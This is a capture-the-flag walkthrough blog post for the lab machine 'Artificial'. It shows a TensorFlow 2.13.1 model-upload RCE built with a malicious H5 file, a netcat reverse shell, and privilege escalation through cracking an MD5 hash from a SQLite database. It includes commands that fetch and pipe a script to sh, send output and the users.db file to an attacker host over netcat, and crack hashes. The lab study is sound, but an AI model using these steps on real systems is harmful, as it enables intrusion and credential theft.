---
layout: post
title: "Artificial"
date: 2025-09-11 00:00:00 -0400
author: Hugo Beaulieu
categories: linux machine
tags: linux tensorflow cve rce hash-cracking sqlite docker
---

## Overview

Artificial is a Linux machine hosting an AI model management platform vulnerable to a TensorFlow 2.13.1 RCE exploit. The exploitation involves creating an account, generating a malicious H5 model file containing a reverse shell payload, uploading it to the platform, and executing it to gain initial access. Privilege escalation is achieved by extracting user credentials from a SQLite database, cracking the MD5 hash, and using the recovered password to switch to the target user.

## Initial Enumeration

### Nmap Scan

We start by scanning the target with nmap:

```bash
nmap -sV -v 100.100.100.100
```

Results:

```
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Artificial - AI Solutions
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

### Directory Enumeration

Using gobuster, we discover several interesting paths:

```bash
gobuster dir -u http://artificial.htb -w wordlist.txt
```

Results:

```
/dashboard            (Status: 302) [Size: 199] [--> /login]
/logout               (Status: 302) [Size: 189] [--> /]
/login                (Status: 200) [Size: 857]
/register             (Status: 200) [Size: 952]
```

### Service Fingerprinting

Running nikto for additional information:

```bash
nikto -h http://artificial.htb
```

```
+ HEAD nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
```

Using whatweb for technology detection:

```bash
whatweb http://artificial.htb
```

```
Summary   : HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], Matomo, nginx[1.18.0], Script
```

The site appears to be running Matomo analytics along with nginx.

## Web Application Analysis

### User Registration

We create a new account on the platform:

```
POST /register HTTP/1.1
Host: artificial.htb
Content-Length: 67
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://artificial.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://artificial.htb/register
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=random4321&email=random4321%40mail.net&password=random4321
```

### Authentication

We log in using the newly created account:

```
POST /login HTTP/1.1
Host: artificial.htb
Content-Length: 47
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://artificial.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://artificial.htb/login
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

email=random4321%40mail.net&password=random4321
```

### Dashboard Access

Upon successful login, we gain access to the dashboard:

```
GET /dashboard HTTP/1.1
Host: artificial.htb
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://artificial.htb/login
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJ1c2VyX2lkIjo3LCJ1c2VybmFtZSI6InJhbmRvbTQzMjEifQ.aJZgPw.oEFDyLs3mb8ucwx9O6sCQaq7uY4
Connection: keep-alive
```

### JWT Token Analysis

We receive a JWT session token containing:

```json
{
  "user_id": 7,
  "username": "random4321"
}
```

### Dashboard Source Code

Examining the dashboard HTML reveals the application's functionality:

```html
<main>
  <section class="dashboard-section">
    <h2>Your Models</h2>
    <p style="color: black;">Upload, manage, and run your AI models here.</p>

    <!-- Warning message for TensorFlow version -->
    <p class="version-warning">
      Please ensure these
      <a href="/static/requirements.txt">requirements</a> are installed when
      building your model, or use our
      <a href="/static/Dockerfile">Dockerfile</a> to build the needed
      environment with ease.
    </p>

    <!-- Upload form -->
    <form
      id="upload-form"
      enctype="multipart/form-data"
      action="/upload_model"
      method="POST"
    >
      <input
        type="file"
        name="model_file"
        accept=".h5"
        class="file-input"
        required=""
      />
      <button type="submit" class="btn" style="color: white;">
        Upload Model
      </button>
    </form>

    <!-- List models -->
    <ul class="model-list"></ul>
  </section>
</main>
```

### Discovering the TensorFlow Environment

We find two key files provided by the application:

**requirements.txt** (Python dependencies):

```
tensorflow-cpu==2.13.1
```

**Dockerfile** that downloads the same package during the build phase:

```dockerfile
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

The homepage also provides example Python code to generate an H5 model:

```python
import numpy as np
import pandas as pd
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers

np.random.seed(42)

# Create hourly data for a week
hours = np.arange(0, 24 * 7)
profits = np.random.rand(len(hours)) * 100

# Create a DataFrame
data = pd.DataFrame({
    'hour': hours,
    'profit': profits
})

X = data['hour'].values.reshape(-1, 1)
y = data['profit'].values

# Build the model
model = keras.Sequential([
    layers.Dense(64, activation='relu', input_shape=(1,)),
    layers.Dense(64, activation='relu'),
    layers.Dense(1)
])

# Compile the model
model.compile(optimizer='adam', loss='mean_squared_error')

# Train the model
model.fit(X, y, epochs=100, verbose=1)

# Save the model
model.save('profits_model.h5')
```

## TensorFlow RCE Exploitation

### Finding the Vulnerability

After researching TensorFlow 2.13.1, we discover a critical RCE exploit: `https://github.com/Splinter0/tensorflow-rce`

This exploit allows us to create a malicious H5 model file that executes arbitrary code when loaded.

### Building the Malicious Payload

We modify the provided Dockerfile to include the exploit and generate our payload:

**Modified Dockerfile:**

```dockerfile
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

# Download the Tensorflow 2.13.1 RCE exploit
RUN curl -O https://raw.githubusercontent.com/Splinter0/tensorflow-rce/refs/heads/main/exploit.py

# Replace the attacker IP and port
RUN sed -i 's/127.0.0.1/10.10.10.10/g' exploit.py && sed -i 's/6666/4444/g' exploit.py

# Generate the malicious h5 model file containing the payload
RUN python exploit.py

ENTRYPOINT ["/bin/bash"]
```

### Payload Generation Script

We create a script to automate the Docker build process:

**generate-payload.sh:**

```bash
#!/bin/bash

# Enable and start Docker service
sudo systemctl enable docker.service && sudo systemctl start docker.service

# Build image (and generate payload)
sudo docker build -t generate-h5-payload .

# Run container
sudo docker run generate-h5-payload

# Get container id
CONTAINER_ID=$(sudo docker container ls -aq --filter "ancestor=generate-h5-payload")

# Download payload from container
sudo docker cp $CONTAINER_ID:/code/exploit.h5 ./exploit.h5
```

### Uploading the Malicious Model

We upload the infected H5 file through the dashboard:

```
POST /upload_model HTTP/1.1
Host: artificial.htb
Content-Length: 10149
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://artificial.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTicDHAyJc5Hia94Y
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://artificial.htb/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJ1c2VyX2lkIjo4LCJ1c2VybmFtZSI6ImhhY2tlckBodGIuY29tIn0.aJ9_0w.tHU1-Tac2fUPZ92LKzRzetX4GbE
Connection: keep-alive

------WebKitFormBoundaryTicDHAyJc5Hia94Y
Content-Disposition: form-data; name="model_file"; filename="exploit.h5"
Content-Type: application/x-hdf

[placeholder for file blob]
------WebKitFormBoundaryTicDHAyJc5Hia94Y--
```

### Getting a Reverse Shell

We start a netcat listener:

```bash
nc -lvnp 4444
listening on [any] 4444 ...
```

Then execute the model from the dashboard:

```
GET /run_model/ef74c658-cbcf-4601-96c6-965fd87e6788 HTTP/1.1
Host: artificial.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://artificial.htb/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJ1c2VyX2lkIjo4LCJ1c2VybmFtZSI6ImhhY2tlckBodGIuY29tIn0.aJ9_0w.tHU1-Tac2fUPZ92LKzRzetX4GbE
Connection: keep-alive
```

The payload executes successfully, and we receive a connection:

```bash
connect to [10.10.10.10] from (UNKNOWN) [100.100.100.100] 56218
/bin/sh: 0: can't access tty; job control turned off
$ whoami && pwd && ls -la
app
/home/app/app
total 36
drwxrwxr-x 7 app app 4096 Jun  9 13:56 .
drwxr-x--- 6 app app 4096 Jun  9 10:52 ..
-rw-rw-r-- 1 app app 7846 Jun  9 13:54 app.py
drwxr-xr-x 2 app app 4096 Aug 15 18:45 instance
drwxrwxr-x 2 app app 4096 Aug 15 18:45 models
drwxr-xr-x 2 app app 4096 Jun  9 13:55 __pycache__
drwxrwxr-x 4 app app 4096 Jun  9 13:57 static
drwxrwxr-x 2 app app 4096 Jun 18 13:21 templates
```

Success! We now have shell access as the `app` user.

## Privilege Escalation

### LinPEAS Enumeration

We need to run LinPEAS for privilege escalation enumeration. First, we serve it from our machine:

**serve-linpeas.sh:**

```bash
#!/bin/bash

# Create directory to expose only linpeas script file
mkdir linpeas && cd linpeas

# Download latest version of linpeas
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

# Start web server on port 8888 to serve latest linpeas script file
sudo python3 -m http.server 8888
```

Then transfer and execute LinPEAS on the target, sending output to our machine:

```bash
nc -lvnp 9999 > linpeas.out # My machine
curl 10.10.10.10:8888/linpeas.sh | sh | nc 10.10.10.10 9999 # Remote box
```

### Key Findings

LinPEAS reveals several interesting details:

```
╔══════════╣ Active Ports
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      6086/python3
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      810/python3
tcp        0      0 127.0.0.1:9898          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -

╔══════════╣ Users with console
app:x:1001:1001:,,,:/home/app:/bin/bash
gael:x:1000:1000:gael:/home/gael:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
uid=1001(app) gid=1001(app) groups=1001(app)

══╣ Logged in users (utmp)
gael     + pts/0        2025-08-15 13:48 06:00        6094 (10.10.10.10)

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
lrwxrwxrwx 1 root root 34 Jun  2 07:38 /etc/nginx/sites-enabled/default -> /etc/nginx/sites-available/default
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    if ($host != artificial.htb) {
        rewrite ^ http://artificial.htb/;
    }
    server_name artificial.htb;
        access_log /var/log/nginx/application.access.log;
        error_log /var/log/nginx/appliation.error.log;
        location / {
                include proxy_params;
                proxy_pass http://127.0.0.1:5000;
        }
}

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
/home/app
/opt/backrest/backrest
/opt/backrest/install.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2025-06-09+09:47:50.9530830600 /usr/local/sbin/laurel
2025-03-03+21:18:52.1240190480 /usr/local/bin/backrest
2025-03-03+04:28:57.3479867980 /opt/backrest/install.sh

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/home/app/app/instance/users.db

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /home/app/app/instance/users.db: SQLite 3.x database, last written using SQLite version 3031001

╔══════════╣ Checking all env variables in /proc/*/environ
HOME=/home/app
LANG=en_US.UTF-8
LOGNAME=app
OLDPWD=/home/app/app
OLDPWD=/tmp
PWD=/home/app/app
PWD=/tmp
SERVER_SOFTWARE=gunicorn/20.0.4
SHELL=/bin/bash
SHLVL=0
TF2_BEHAVIOR=1
TPU_ML_PLATFORM=Tensorflow
USER=app
```

The most interesting finding is `/home/app/app/instance/users.db` - if the `gael` user configured the application, their credentials might be stored there.

### Extracting the Database

We transfer the database file to our machine using netcat:

```bash
nc -lvp 9999 > users.db # My machine
cat /home/app/app/instance/users.db | nc 10.10.10.10 9999 # Remote box
```

### Examining the Database

We open it with sqlite3:

```bash
$ sqlite3 users.db
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
model  user
sqlite> SELECT * FROM user;
1|gael|gael@artificial.htb|[REDACTED-MD5-HASH]
2|mark|mark@artificial.htb|[REDACTED-MD5-HASH]
3|robert|robert@artificial.htb|[REDACTED-MD5-HASH]
4|royer|royer@artificial.htb|[REDACTED-MD5-HASH]
5|mary|mary@artificial.htb|[REDACTED-MD5-HASH]
6|solomon|sol@mial.com|[REDACTED-MD5-HASH]
7|solo|solo@mail.com|[REDACTED-MD5-HASH]
8|hacker@htb.com|hacker@htb.com|[REDACTED-MD5-HASH]
```

Perfect! We've found hashed passwords for all users, including `gael`.

### Hash Identification

We identify the hash type using name-that-hash:

```bash
# Install name-that-hash
pip3 install name-that-hash

# Identify the hash
nth -t "[REDACTED-MD5-HASH]"

Most Likely
MD5, HC: 0 JtR: raw-md5 Summary: Used for Linux Shadow files.
MD4, HC: 900 JtR: raw-md4
NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory.
Domain Cached Credentials, HC: 1100 JtR: mscach
```

The hash is MD5.

### Hash Cracking

We create a script to crack the hash using hashcat:

**crack-hash.sh:**

```bash
#!/bin/bash
MODE=0
HASH="[REDACTED-MD5-HASH]"
WORDLIST_URL="./rockyou.txt.tar.gz"

# Create new directory to work in
mkdir ~/hash && cd ~/hash

# Download wordlist
curl -O $WORDLIST_URL && tar -xvzf $(basename $WORDLIST_URL)

# Output the hash to a temporary file
echo $HASH > hash.txt

# Crack the hash
hashcat -m $MODE -a 0 hash.txt ./*.txt -w 4
```

The password is successfully cracked: `[REDACTED]`

```
[REDACTED-MD5-HASH]:[REDACTED]

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: [REDACTED-MD5-HASH]
Time.Started.....: Fri Aug 15 15:55:46 2025 (2 secs)
Time.Estimated...: Fri Aug 15 15:55:48 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (./rockyou.txt)
Guess.Queue......: 2/2 (100.00%)
Speed.#2.........:  3188.4 kH/s (0.17ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5722112/14344384 (39.89%)
Rejected.........: 0/5722112 (0.00%)
Restore.Point....: 5720064/14344384 (39.88%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: matuat -> mattj32
```

### User Flag

We switch to the `gael` user and retrieve the flag:

```bash
$ su gael
Password: [REDACTED]
whoami
gael
cd /home/gael
ls -la
total 36
drwxr-x--- 5 gael gael 4096 Aug 15 14:00 .
drwxr-xr-x 4 root root 4096 Jun 18 13:19 ..
lrwxrwxrwx 1 root root    9 Oct 19  2024 .bash_history -> /dev/null
-rw-r--r-- 1 gael gael  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 gael gael 3771 Feb 25  2020 .bashrc
drwx------ 2 gael gael 4096 Sep  7  2024 .cache
drwxr-xr-x 3 gael gael 4096 Aug 15 13:54 .local
-rw-r--r-- 1 gael gael  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root    9 Oct 19  2024 .python_history -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 19  2024 .sqlite_history -> /dev/null
drwx------ 2 gael gael 4096 Sep  7  2024 .ssh
-rw-r----- 1 root gael   33 Aug 15 02:12 user.txt
cat user.txt
[censored-htb-flag]
```

Success! We've obtained the user flag.

## Key Takeaways

- **TensorFlow 2.13.1** contains a critical RCE vulnerability in model deserialization
- **H5 model files** can be weaponized to execute arbitrary code when loaded
- **Docker environments** can be useful for generating exploit payloads in isolated environments
- **SQLite databases** storing user credentials should be properly secured
- **MD5 hashing** is cryptographically broken and should never be used for password storage
- **Weak passwords** in rockyou.txt can be cracked quickly even with salted hashes
- **Application configuration files** often contain sensitive database credentials
- **JWT tokens** should be properly validated on the server side
- **File upload functionality** requires strict validation of file types and content
- **AI/ML platforms** handling model files need robust security controls
